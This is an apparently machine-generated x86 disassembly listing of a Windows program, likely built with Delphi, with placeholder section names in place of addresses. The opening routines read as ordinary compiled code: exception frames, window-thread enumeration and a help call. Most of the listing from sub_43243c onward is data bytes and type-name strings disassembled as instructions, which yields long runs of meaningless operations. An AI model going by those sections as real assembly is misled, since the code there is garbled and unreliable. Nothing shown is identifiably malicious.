sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_432164
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_4321da
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_432148
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4321e1
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407c70
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4321f0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43220c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_432148
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4321ec
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4321f0
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_432268
sub_432268
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4322e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_431cc8
call GetTickCount
mov ebx eax
push 0x0
call sub_406224
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4318c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4322ec
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4322f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035a0
call sub_4056a4
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43233c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_432368
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4323d6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4323dd
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_40568c
mov eax rw-data
call sub_40568c
mov eax rw-data
call sub_40568c
mov eax rw-data
call sub_404050
mov eax rw-data
call sub_40568c
mov eax [ rw-data ]
call sub_431998
sub_4323e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432432
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432439
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4322f4
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_40568c
mov edx eax
mov eax [ rw-data ]
call sub_424268
sub_43243c
inc eax
and al 0x43
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
cmp [ ebp + 0x43 ] cl
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ eax - 0x27ffbcb3 ] cl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x4e240040 ] al
inc ebx
add [ ecx * 2 + 0x4d100043 ] dl
inc ebx
add [ esp + ecx * 2 ] dl
inc ebx
add ah cl
dec ebp
inc ebx
add al bl
dec ebx
inc ebx
add [ ecx * 2 + 0x4d300043 ] ch
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x25 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx + 0x25 ] si
inc ebx
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
pop esp
and al 0x43
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add [ eax ] bl
and eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x25
inc ebx
add [ eax + eax ] dh
jae r-xdata
add [ esi + r--data ] ch
inc esp
jb r-xdata
add [ eax ] bh
dec ebp
inc ebx
add al bh
dec ebp
inc ebx
add [ eax + 0x1600434d ] ch
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add [ eax - 0x77ffbcb3 ] bl
dec ebp
inc ebx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x4bd00040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x340043 ] bh
jb r-xdata
add [ eax + 0x4e ] bl
inc ebx
add ah al
xor al 0x40
add [ eax - 0x77ffbcb3 ] bl
add [ eax ] al
jo r-xdata
add [ eax ] al
lodsb [ esi ]
inc ebx
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x4325bcc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
and eax 0x3c0043
add [ eax ] al
int3
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
je r-xdata
inc ebx
add [ eax + 0x4e ] dh
inc ebx
add [ esp + ecx * 2 ] dl
inc ebx
add ah cl
dec ebp
inc ebx
add al bl
dec ebx
inc ebx
add [ esi + ecx * 2 + 0x43 ] bh
add [ eax ] dh
inc ebx
outsd
outsb
je r-xdata
dec ebp
inc ebx
add al bl
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4 ] si
inc ebx
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
or [ ecx + 0x6c ] ah
inc ebx
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x24 ] dh
inc ebx
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
dec ebp
inc ebx
add [ esi + ecx * 2 + 0x4df80043 ] bl
inc ebx
add [ eax + 0x1400434d ] ch
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0xc ] si
daa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
daa
inc ebx
add [ eax ] al
add [ eax ] al
xor al 0x26
inc ebx
add ah al
xor al 0x40
add [ eax - 0x43ffbcb3 ] bl
dec esi
inc ebx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x4e240040 ] al
inc ebx
add [ eax + 0x4e ] bl
int3
inc esp
jb r-xdata
inc ebx
add [ ecx * 2 + 0x4d100043 ] dl
inc ebx
add [ esp + ecx * 2 ] dl
inc ebx
add [ eax + 0x4b ] bh
inc ebx
add al bl
dec ebx
xor al [ eax ]
test [ edx ] dh
inc eax
add al dl
dec ebx
outsd
insd
push es
popad
insb
dec esp
je r-xdata
inc edx
outsd
je r-xdata
popad
insb
inc ebx
add ah al
xor al 0x40
add [ eax - 0x4fffbcb3 ] bl
push eax
inc ebx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi + ecx * 2 ] ah
inc ebx
add [ esi + ecx * 2 ] ah
inc ebx
add [ eax + edx * 2 + 0x4d100043 ] bl
inc ebx
add [ esp + ecx * 2 ] dl
inc ebx
add [ edi + ecx * 2 + 0x43 ] dl
add al bl
dec ebx
inc ebx
add [ ecx * 2 + 0x4d300043 ] ch
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 8 + 0x27 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 4 + 0x27 ] si
inc ebx
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] bh
dec ebp
inc ebx
add [ eax - 0x3fffbcb1 ] dh
dec esi
inc ebx
add al bh
dec edi
inc ebx
add [ eax + edx * 2 + 0x43 ] dh
add [ eax - 0x57ffbcb0 ] cl
push eax
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
dec ebp
inc ebx
add [ eax ] dh
dec ebp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
pushfd
daa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
daa
inc ebx
add [ eax ] dh
add [ eax ] al
jo r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x4e240040 ] al
inc ebx
inc ebx
outsd
outsb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
add [ eax - 0x16 ] ah
inc ecx
add [ edx + ebp * 8 + 0x41 ] cl
add [ edx + 0x540e0043 ] ch
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
cld
sub [ ebx ] al
add [ eax ] bh
dec ebp
inc ebx
add [ eax - 0x3fffbcb1 ] dh
dec esi
inc ebx
add al bh
dec edi
inc ebx
add [ eax + edx * 2 + 0x43 ] dh
add [ eax - 0x57ffbcb0 ] cl
push eax
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax + edx * 2 + 0x4d100043 ] bl
inc ebx
add [ esp + ecx * 2 ] dl
inc ebx
add [ edi + ecx * 2 + 0x43 ] dl
add al bl
dec ebx
inc ebx
add [ ecx * 2 + 0x4d300043 ] ch
inc ebx
add ah al
xor al 0x40
add [ eax - 0x77ffbcb3 ] bl
dec ebp
inc ebx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi + ecx * 2 ] ah
inc ebx
add [ esi + ecx * 2 ] ah
inc ebx
add [ eax + 0x4e ] dh
inc ebx
add [ esp + ecx * 2 ] dl
inc ebx
add ah cl
dec ebp
inc ebx
add al bl
dec ebx
inc ebx
add [ esi + ecx * 2 + 0x43 ] bh
add [ eax ] dh
dec ebp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 4 + 0x25 ] si
inc ebx
add [ eax + 0x25 ] cl
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] bh
dec ebp
inc ebx
sub al 0x4d
inc ebx
add [ eax ] dh
dec ebp
je r-xdata
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0xfffbe4f ] ah
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x432860c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x700043 ] bl
add [ eax ] al
push eax
daa
inc ebx
add [ esi + ecx * 2 + 0x4df80043 ] bl
inc ebx
add [ eax + 0x1200434d ] ch
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ ecx * 2 + 0x4d300043 ] ch
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x432a3090
add [ ebx ] al
or al 0x54
add ah dl
xor al 0x40
jae r-xdata
add [ ebp + 0x26800040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] dl
inc ebx
add [ eax + eax ] ah
add al ah
mov [ ecx ] 0xc4
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x50004362 ] al
dec eax
inc ecx
add [ eax + 0x48 ] bl
sub [ ecx ] ch
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ ebx + ebp + 0x8060043 ] bl
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
add [ eax ] dl
inc ebx
add [ eax ] cl
mov dl 0x41
add [ edi - 0x4ea7ffbd ] bh
inc ecx
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
outsd
insb
inc ebx
popad
outsb
inc ebx
add [ eax + 0x2b ] edx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb00432a ] ch
jae r-xdata
sub al 0x2b
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ebp ] ch
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc ebx
add ah dl
mov cl 0x41
mov al [ 0xfffffffff00041b1 ]
jae r-xdata
push eax
inc ebx
inc ebx
outsd
outsb
jae r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
sub al [ ebx ]
push es
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
shr [ edx + ebp + 0xa030043 ] 0x54
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jbe r-xdata
sub [ ebx ] al
dec esp
mov [ ecx ] 0x43080004
outsd
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
popad
js r-xdata
jb r-xdata
add [ eax + 0x48 ] bl
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
add ah bl
inc ebx
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add ah dl
xor al 0x40
add al bl
xor al 0x40
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
inc ecx
add ah bh
inc ebx
add ah ah
cmp [ eax + eax + 0x70 ] al
inc bx
add [ ecx + edi ] cl
inc esp
add [ eax ] ah
cmp [ eax + eax - 0x18 ] eax
inc ebx
add [ esi + 0x395c0043 ] ah
inc esp
add [ eax + 0x39 ] dh
inc esp
add ah bl
inc bx
add [ eax + 0x38004439 ] bl
inc ebx
add [ eax + 0x58004439 ] ah
inc ebx
add [ eax + 0x6c004439 ] ch
push 0x684c0043
inc ebx
add [ eax + ebp * 2 + 0x67780043 ] cl
inc ebx
add [ ecx + edi + 0x39c00044 ] bh
inc esp
add [ edi + 0x650c0043 ] bl
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax ] al
or [ ebp + 0x61 ] ecx
sub eax [ ebx ]
adc al 0x0
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x74 ] r-xdata
inc esp
sub al 0x43
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add [ eax ] cl
fdiv [ eax + eax * 2 ]
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
sub al [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
add [ ebp + 0x299c0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub al [ ebx ]
sbb al 0x0
add [ eax ] al
pushfd
xor al [ eax + eax - 0x3c ]
xor al 0x40
add al dl
xor al 0x40
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
add bh bh
push eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
add [ 0xb080043 ] ch
push esp
dec ebp
outsd
imul esp [ edi + 0x68 ] 0x432bac74
imul esp [ gs : edi + 0x68 ] 0x432bac74
add [ eax + eax ] cl
add bh bh
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x2b54c08b
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
dec esp
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
adc [ eax ] al
add bh bh
push eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
lodsb [ esi ]
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x432bac74
jb r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add ah cl
arpl [ ebx ] ax
inc ebx
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
push esp
sub eax [ ebx ]
add ecx [ ebx ]
push esp
inc ecx
outsb
or [ ebx + 0x6f ] al
outsb
je r-xdata
lea eax [ eax ]
clc
insb
add [ ecx + edx ] cl
inc eax
add [ eax - 0x1fffbff0 ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
sub eax [ ebx ]
imul ebp [ esi + 0x74 ] 0x432c1873
add [ esp + ebx + 0x41 ] ch
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x2b ] dl
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
outsb
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ ecx + edx ] cl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + ebp + 0x43 ] ch
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
sub al [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
inc eax
add al bh
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x432a ] ch
or al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
js r-xdata
add [ eax ] cl
add [ eax ] al
call [ eax + 0x64 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
add [ ebx + ebp + 0x80043 ] ch
add bh bh
push eax
inc ebx
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
adc al 0x41
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add al ah
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
dec esp
das
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
adc [ eax ] al
nop
in al dx
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
test al 0x2a
inc ebx
add [ eax ] al
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or al 0x11
inc eax
add [ eax + 0x25 ] cl
inc ebx
add [ edi + ebp + 0xd080043 ] dl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
